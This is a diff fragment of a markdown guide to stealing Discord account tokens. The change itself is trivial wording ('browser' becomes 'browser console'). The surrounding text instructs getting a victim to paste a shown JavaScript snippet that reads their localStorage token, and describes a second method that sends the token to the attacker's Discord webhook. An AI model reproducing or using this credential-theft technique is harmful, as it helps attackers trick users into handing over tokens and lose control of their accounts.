@@ -51,7 +51,7 @@ Our first goal is to obtain the discord token. This can be done through a C++ pr
 
 ### Method 1: Get user to send you the token or get it yourself (JavaScript)
 
-Get user to copy and paste this code into browser and send you back the token. Token will be alerted in window and logged in console. 
+Get user to copy and paste this code into browser console and send you back the token. Token will be alerted in window and logged in console. 
 
 ``` function getLocalStoragePropertyDescriptor() {const iframe = document.createElement('iframe');document.head.append(iframe);const pd = Object.getOwnPropertyDescriptor(iframe.contentWindow, 'localStorage');iframe.remove();return pd;} Object.defineProperty(window, 'localStorage', getLocalStoragePropertyDescriptor());console.log(localStorage.token); window.alert(localStorage.token); ```
 
@@ -68,7 +68,7 @@ Alternative codes, follow the same steps as above.
 
 ### Method 2: Get user to run code and token will be sent to you (JavaScript)
 
-Get user to copy and paste this code into browser and token will be automatically sent back to you via discord webhook. Replace ```YOUR DISCORD WEBHOOK HERE``` with your discord webhook URL.
+Get user to copy and paste this code into browser console and token will be automatically sent back to you via discord webhook. Replace ```YOUR DISCORD WEBHOOK HERE``` with your discord webhook URL.
 
 <details>
 
